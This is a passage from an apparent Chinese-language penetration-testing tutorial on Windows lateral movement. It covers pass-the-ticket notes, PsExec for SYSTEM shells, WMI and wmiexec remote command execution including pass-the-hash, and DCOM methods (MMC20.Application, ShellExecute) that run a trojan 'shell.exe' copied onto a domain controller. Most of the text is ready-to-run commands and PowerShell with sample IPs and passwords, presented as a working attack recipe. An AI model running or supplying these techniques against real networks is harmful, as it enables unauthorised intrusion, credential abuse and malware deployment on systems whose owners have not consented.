#### 10.4.3、票据传递攻击注意事项

- 使用dir命令时，务必使用主机名。如果使用IP地址，就会导致错误。
- 票据文件注入内存的默认有效时间为10小时
- 在目标机器上不需要本地管理员权限即可进行票据传递

### 10.5、PsExec的使用

PsExec可以在Window vista/NT 4.0/2000/XP/server 2003/server 2008/server 2012/server 2016上运行。

**psexec的使用前提：**

- 对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名
- 对方未开启防火墙
- 如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。
- 如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。

在建立IPC连接的情况下，执行如下命令，获取system权限的shell：

```html
psexec.exe -accepteula \\192.168.100.190 -s cmd.exe
```

如果没有建立IPC，psexec有两个参数可以通过指定账号和密码进行远程连接：

```html
psexec.exe \\192.168.100.190 -u administrator -p 123456 cmd.exe
```

执行如下命令，在远程计算机上回显：

```html
psexec.exe \\192.168.100.190 -u administrator -p 123456 cmd.exe /c "ipconfig"
```

### 10.6、WMI的使用

常用命令

```
wmic useraccount WHERE "Name='%username%'" set PasswordExpires=false    //设置用户永不超期    wmic startup list brief                             //wmic获取自启信息 
wmic volume list brief                              //wmic获取磁盘分区信息    
wmic useraccount list full                          //wmic获取用户信息    
wmic service list full                              //wmic获取服务信息    
wmic SERVICE where name="dhcp" call stopservice     //wmic关闭服务    
wmic DESKTOPMONITOR get ScreenHeight,ScreenWidth    //wmic获取屏幕分辨率    
wmic process where processid="3652" delete          //wmic关闭进程    
wmic process 2345 call terminate                    //wmic关闭进程    
wmic process where name="qq.exe" call terminate     //wmic关闭进程    
wmic qfe get Caption,Description,HotFixID,InstalledOn   //wmic获取补丁安装时间    
wmic process where name="ConsoleApplication.exe" get ExecutablePath        //查看进程的位置    wmic.exe /node:ip /user:localhost\administrator /password:"password" PROCESS call create "cmd.exe /c whoami > ip.txt"    
type \\192.168.52.129\c$\ip.txt           //远程命令执行    
wmic qfe get hotfixid                              //查看补丁情况
```

#### 10.6.1、列出远程主机进程

```html
wmic /node:192.168.52.129 /user:administrator /password:Password!! process list brief
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaOCmdZWuibG0vdZv8eXIKYqRNDvIPl7RQEtdHQcyuUibF9jn601MBw9lQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

#### 10.6.2、远程创建进程

可以看到在目标机器192.168.52.129成功执行了系统命令并输出到"tubai.txt"，在目标指定目录可以发现文件。

```html
wmic /node:192.168.52.129 /user:administrator /password:Password!! process call create "cmd.exe /c ipconfig > c:\tubai.txt"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVa9kcztxLvYj71gMHgjITmgD88LAPTj5xlEoPIRpxUBtbBDRvJujRosQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaMAgAQPjbdmzhfT60afNoaFcvFqCk56013icokHdiaHlqFPrzNtgk8Qeg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

#### 10.6.3、WMIEXEC工具

**wmiexec.vbs**

```html
cscript wmiexec.vbs /shell 192.168.52.129 administrator Password!!
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVanXa4P4UOG7Mx47RIrALrwatd50gF4c7B0vuoYIibj52wP171FiaaHghQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**impacket套件**

项目地址：

```html
https://github.com/maaaaz/impacket-examples-windows
```

```html
wmiexec.exe administrator:Password!!@192.168.52.129
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFiazacc9SDVlhJVaW871pLVaEkb7pV8p4EbOSSMNQqFlbVBcHlV4q0qAj7tFvwfew3WUUS1CZMHshQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

哈希传递

```html
wmiexec.exe -hashes LM哈希：NTLM哈希 域名/用户名@目标IP
```

### 10.7、利用DCOM在远程机器中执行命令

在使用该方法的条件如下：

- 需要关闭目标系统的防火墙，如果目标主机DC没有关闭防火想的话会报错
- 在远程主机上执行命令时，必须使用具有本地管理员权限的账号。

**1. 先让跳板机通过ipc连接远程DC计算机**

```
net use \\\192.168.52.138\ipc$ "Liufupeng123" /user:Liukaifeng01
```

**2. 然后在跳板机上传木马程序shell.exe，并使用copy命令将shell.exe复制到DC的c盘上面去。**

![1601630452_5f76f0f4313bb831b3bd4.png](https://image.3001.net/images/20201002/1601630452_5f76f0f4313bb831b3bd4.png)

**3. 然后对DC执行远程命令**

（1）调用MMC20.Application远程执行命令

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.52.138"))
// 通过PowerShell与DCOM进行远程交互，此外，我们只需要提供一个DCOM ProgID和一个IP地址，然后，它就从远程返回一个COM对象的实例。
// 然后执行如下命令，我们就可以调用"ExecuteShellCommand"方法在远程主机上启动进程
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c c:\shell.exe","Minimized")
```

![1601631009_5f76f32101f4fac521691.png](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1601631009_5f76f32101f4fac521691.png)

（2）调用9BA05972-F6A8-11CF-A442-00A0C90A8F39

```
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.52.138")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.item()
$item.Document.Application.ShellExecute("cmd.exe","/c c:\shell.exe","c:\windows\system32",$null,0)
```

这两种方法远程执行命令的方法均适用于Windows 7~Windows 10、Windows Server 2008~Windows Server 2016。
